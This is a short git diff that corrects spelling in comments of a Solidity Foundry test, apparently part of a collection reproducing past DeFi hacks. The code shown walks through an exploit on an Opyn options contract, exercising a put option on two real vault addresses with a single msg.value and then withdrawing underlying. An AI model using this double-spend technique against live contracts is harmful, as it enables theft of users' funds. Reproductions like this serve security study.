@@ -36,15 +36,15 @@ contract ContractTest is Test {
         uint256 amtCollateral = 9_900_000_000;
         opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);
 
-        //create an arry of vaults
+        //create an array of vaults
         address payable[] memory _arr = new address payable[](2);
         _arr[0] = payable(0xe7870231992Ab4b1A01814FA0A599115FE94203f);
         _arr[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);
 
-        //The attacker excercises the put option on two different valuts using the same msg.value
+        //The attacker exercises the put option on two different vaults using the same msg.value
         opyn.exercise{value: 30 ether}(600_000_000, _arr);
 
-        //remove share of underlying after excercise
+        //remove share of underlying after exercise
         opyn.removeUnderlying();
 
         uint256 balAfter = usdc.balanceOf(attacker) / 1e6;
